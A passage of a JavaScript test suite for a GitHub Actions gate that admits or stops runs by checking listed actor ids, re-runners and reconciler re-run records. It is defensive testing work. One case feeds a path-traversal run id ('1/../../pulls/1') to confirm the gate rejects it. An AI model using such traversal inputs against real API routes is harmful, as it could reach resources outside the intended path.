  test(`re-runner by id: ${name}, a listed id proceeds whatever its login`, async () => {
    const args = path_();
    args.github ??= fakeGitHub({});
    assert.deepEqual(
      await gate({ ...args, triggeringActor: "kyle-renamed", rerunner: { ...USERS["kyle-sexton"], login: "kyle-renamed" } }),
      PROCEED,
    );
    assert.ok(args.github.calls.includes(OWN_ROUTE));
  });

  test(`re-runner by id: ${name}, a failed own-run read stops`, async () => {
    assert.deepEqual(
      await gate({ ...path_(), ownRun: new GitHubError(403, OWN_ROUTE) }),
      STOPPED("untrusted-rerunner"),
    );
  });
}

const actorPaths = {
  workflow_dispatch: () => ({}),
  push: () => ({ eventName: "push", event: { sender: STRANGER } }),
  issues: () => ({ eventName: "issues", requireKind: "human" }),
};

for (const [name, path_] of Object.entries(actorPaths)) {
  test(`re-runner by id: actor-only ${name}, a listed login held by another id stops`, async () => {
    const { outputs, calls } = await actorOnly({ ...path_(), rerunner: IMPOSTOR });
    assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
    assert.deepEqual(calls, [OWN_ROUTE]);
  });

  test(`re-runner by id: actor-only ${name}, a failed own-run read stops`, async () => {
    const { outputs } = await actorOnly({ ...path_(), ownRun: new GitHubError(403, OWN_ROUTE) });
    assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
  });
}

test("re-runner by id: app-label, the App's login held by another id stops", async () => {
  const { outputs } = await appLabel({ rerunner: { ...LANES_APP, id: 9999003 } });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("re-runner by id: app-label, a human's login held by another id stops", async () => {
  const { outputs } = await appLabel({ triggeringActor: "kyle-sexton", rerunner: IMPOSTOR });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("re-runner by id: app-label, the App as re-runner must still be on the list", async () => {
  const list = writeJson("no-app.json", {
    version: 1,
    actors: [{ id: 153232337, login: "kyle-sexton", kind: "human" }],
  });
  const { outputs } = await appLabel({ list });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

test("re-runner by id: app-label, a failed own-run read stops", async () => {
  const { outputs } = await appLabel({ ownRun: new GitHubError(403, OWN_ROUTE) });
  assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
});

// work-resolve-issue.yml's admit job: require-pr false, require-kind human,
// app-label agent-ready and the lanes App id.
test("re-runner by id: the admit inputs admit a listed human's or the App's agent-ready label", async () => {
  assert.deepEqual(await appLabel({ sender: KYLE, triggeringActor: "kyle-sexton", deniedActorIds: "" }), {
    outputs: ACTORS_OK,
    calls: [OWN_ROUTE],
  });
  assert.deepEqual(await appLabel({ deniedActorIds: "" }), { outputs: ACTORS_OK, calls: [OWN_ROUTE] });
  const { outputs } = await appLabel({ sender: STRANGER, triggeringActor: "stranger", deniedActorIds: "" });
  assert.deepEqual(outputs, STOPPED("untrusted-actor"));
});

const malformed = {
  "a non-object body": null,
  "an array body": [],
  "no triggering_actor": { id: Number(OWN_RUN_ID), run_attempt: 1 },
  "a string triggering_actor id": {
    id: Number(OWN_RUN_ID),
    run_attempt: 1,
    triggering_actor: { ...USERS["kyle-sexton"], id: "153232337" },
  },
  "another run's id": { id: 39000000002, run_attempt: 1, triggering_actor: USERS["kyle-sexton"] },
  "another attempt": { id: Number(OWN_RUN_ID), run_attempt: 2, triggering_actor: USERS["kyle-sexton"] },
};

for (const [label, ownRun] of Object.entries(malformed)) {
  test(`re-runner by id: a run record with ${label} stops`, async () => {
    assert.deepEqual(
      await gate({ eventName: "pull_request", event: fixture("event-pull-request.json"), ownRun }),
      STOPPED("untrusted-rerunner"),
    );
    const { outputs } = await actorOnly({ ownRun });
    assert.deepEqual(outputs, STOPPED("untrusted-rerunner"));
  });
}

for (const [label, ids] of [
  ["no run id", { runId: "" }],
  ["a malformed run id", { runId: "1/../../pulls/1" }],
  ["no run attempt", { runAttempt: "" }],
]) {
  test(`re-runner by id: ${label} stops before any read`, async () => {
    const github = fakeGitHub({});
    assert.deepEqual(
      await gate({ eventName: "pull_request", event: fixture("event-pull-request.json"), github, ...ids }),
      STOPPED("untrusted-rerunner"),
    );
    assert.deepEqual(github.calls, []);
  });
}

// A lost CI run the reconciler re-ran: the upstream run a workflow_run event
// names is at attempt 2, started by github-actions[bot], and the reconciler
// recorded reconcile-rerun-<upstream run id>-2-<head sha> before the re-run.
// This run's own attempt is a listed actor's.

const CI_RERUN_ID = 39310000010;
const CI_RERUN_RECORD = `reconcile-rerun-${CI_RERUN_ID}-2-${HEAD_SHA}`;
const upstreamAttemptRoute = `GET /repos/${REPOSITORY}/actions/runs/${CI_RERUN_ID}/attempts/2`;
const upstreamArtifactsRoute = `GET /repos/${REPOSITORY}/actions/artifacts?name=${CI_RERUN_RECORD}&per_page=100&page=1`;
const artifactsByName = (name) => `GET /repos/${REPOSITORY}/actions/artifacts?name=${name}&per_page=100&page=1`;

function upstreamRerunEvent(overrides = {}) {
  const event = rerunEvent();
  event.workflow_run = { ...event.workflow_run, id: CI_RERUN_ID, run_attempt: 2, triggering_actor: ACTIONS_BOT, ...overrides };
  return event;
}

function upstreamRoutes({ attempt = {}, artifacts = listing(rerunRecord({ name: CI_RERUN_RECORD })), extra = {} } = {}) {
  return {
    [commitPulls]: [fixture("api-pull-42.json")],
    [upstreamAttemptRoute]: lostAttempt({ id: CI_RERUN_ID, name: "pr-require-checks", path: ".github/workflows/pr-require-checks.yml", event: "pull_request", head_branch: "feat/lane-probe", head_sha: HEAD_SHA, ...attempt }),
    [upstreamArtifactsRoute]: artifacts,
    [reconcilerRoute]: reconcilerRun(),
    [tipRoute]: TIP_REF,
    [reconcilerCompare]: { status: "ahead" },
    ...extra,
  };
}

const upstreamRerun = ({ github, event = upstreamRerunEvent(), ...rest }) =>
  gate({ eventName: "workflow_run", event, github, reconcilerWorkflow: RECONCILER_WORKFLOW, ...rest });

test("upstream re-run: a CI attempt 2 by github-actions[bot] with the reconciler's record proceeds", async () => {
  const github = fakeGitHub(upstreamRoutes());
  assert.deepEqual(await upstreamRerun({ github }), PROCEED);
  assert.ok(github.calls.includes(upstreamAttemptRoute));
  assert.ok(github.calls.includes(upstreamArtifactsRoute));
  assert.ok(github.calls.includes(OWN_ROUTE));
});

test("upstream re-run: with no record the bot stays an untrusted actor after one re-read", async () => {
  const sleep = fakeSleep();
  const github = fakeGitHub(upstreamRoutes({ artifacts: listing() }));
  assert.deepEqual(await upstreamRerun({ github, sleep }), STOPPED("untrusted-actor"));
  assert.equal(github.calls.filter((call) => call === upstreamArtifactsRoute).length, 2);
  assert.deepEqual(sleep.waits, [5000]);
});

for (const [label, name] of [
  ["another run id", `reconcile-rerun-${CI_RERUN_ID + 1}-2-${HEAD_SHA}`],
  ["another head SHA", `reconcile-rerun-${CI_RERUN_ID}-2-${LOST_HEAD}`],
]) {
  test(`upstream re-run: a record for ${label} refuses with untrusted-actor`, async () => {
    const github = fakeGitHub(upstreamRoutes({ artifacts: listing(), extra: { [artifactsByName(name)]: listing(rerunRecord({ name })) } }));
    assert.deepEqual(await upstreamRerun({ github }), STOPPED("untrusted-actor"));
    assert.ok(!github.calls.includes(artifactsByName(name)));
  });
}

for (const runAttempt of [1, 3]) {
  test(`upstream re-run: github-actions[bot] at attempt ${runAttempt} refuses and reads no record`, async () => {
    const github = fakeGitHub(upstreamRoutes());
    assert.deepEqual(await upstreamRerun({ github, event: upstreamRerunEvent({ run_attempt: runAttempt }) }), STOPPED("untrusted-actor"));
    assert.deepEqual(github.calls, [commitPulls]);
  });
}

test("upstream re-run: without reconciler-workflow the bot refuses and reads no record", async () => {
  const github = fakeGitHub(upstreamRoutes());
  assert.deepEqual(await upstreamRerun({ github, reconcilerWorkflow: "" }), STOPPED("untrusted-actor"));
  assert.deepEqual(github.calls, [commitPulls]);
});

for (const [label, change] of [
  ["the upstream run's actor", (event) => (event.workflow_run.actor = STRANGER)],
  ["the sender", (event) => (event.sender = STRANGER)],
]) {
  test(`upstream re-run: a record does not vouch for an unlisted ${label.replace(/^the /, "")}`, async () => {
    const event = upstreamRerunEvent();
    change(event);
    const github = fakeGitHub(upstreamRoutes());
    assert.deepEqual(await upstreamRerun({ github, event }), STOPPED("untrusted-actor"));
    assert.ok(!github.calls.includes(upstreamArtifactsRoute));
  });
}

test("upstream re-run: an attempt GitHub reports was started by someone else refuses", async () => {
  const github = fakeGitHub(upstreamRoutes({ attempt: { triggering_actor: KYLE } }));
  assert.deepEqual(await upstreamRerun({ github }), STOPPED("untrusted-actor"));
});

test("upstream re-run: a record does not vouch for an unlisted re-runner of this run", async () => {
  const github = fakeGitHub(upstreamRoutes());
  assert.deepEqual(await upstreamRerun({ github, runAttempt: "2", rerunner: STRANGER }), STOPPED("untrusted-rerunner"));
});
